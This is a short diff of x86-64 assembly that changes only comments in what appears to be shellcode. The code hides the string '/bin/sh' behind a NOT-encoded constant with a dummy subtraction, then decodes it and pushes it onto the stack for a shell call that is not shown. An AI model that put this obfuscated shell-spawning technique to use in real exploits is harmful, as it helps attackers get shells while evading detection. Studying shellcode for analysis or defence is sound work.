@@ -17,10 +17,10 @@ _start:
 	push rsp
         pop rdi
 
-	mov	rcx,0x978cd091969dd033    ; "33" dummy bytes
+	mov	rcx,0x978cd091969dd033    ; "/bin/sh" "noted" , followed by dummy substraction operation ("33") dummy bytes
         sub cl , 33
 	not 	rcx
-	shr	rcx,0x08     ; "/bin/sh" "noted" , preceded by dummy substraction operation
+	shr	rcx,0x08     ;
         push 	rcx
 	push rsp
         pop rcx
